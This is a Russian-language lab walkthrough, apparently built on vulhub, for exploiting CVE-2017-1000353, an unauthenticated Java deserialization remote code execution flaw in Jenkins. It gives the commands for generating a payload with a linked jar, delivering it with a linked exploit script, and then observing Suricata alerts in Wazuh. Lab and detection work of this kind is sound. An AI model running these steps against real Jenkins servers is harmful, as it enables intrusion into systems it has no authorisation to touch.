# CVE-2017-1000353

Jenkins версий 2.56 и более ранних, а также 2.46.1 LTS и более ранних уязвимы для удаленного выполнения кода без проверки подлинности. Уязвимость удаленного выполнения кода без аутентификации позволяла злоумышленникам передавать сериализованный Java-объект SignedObject в интерфейс командной строки Jenkins, который затем десериализовался с использованием нового ObjectInputStream в обход существующего механизма защиты на основе черного списка.

### Экслуатация уязвимости

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

После успешного запуска по адресу http://ваш-ip:8080/ будет доступна страница Jenkins

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Для реализации данной уязвимости нужно сгенерировать полезную нагрузку с помощью этого [файла](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)

```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Далее с помощью [эксплоита](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py) доставить полезную нагрузку&#x20;

```
python3 exploit.py http://ваш-ip:8080 jenkins_poc.ser
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

В результате эксплуатации был создан файл /tmp/success&#x20;

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
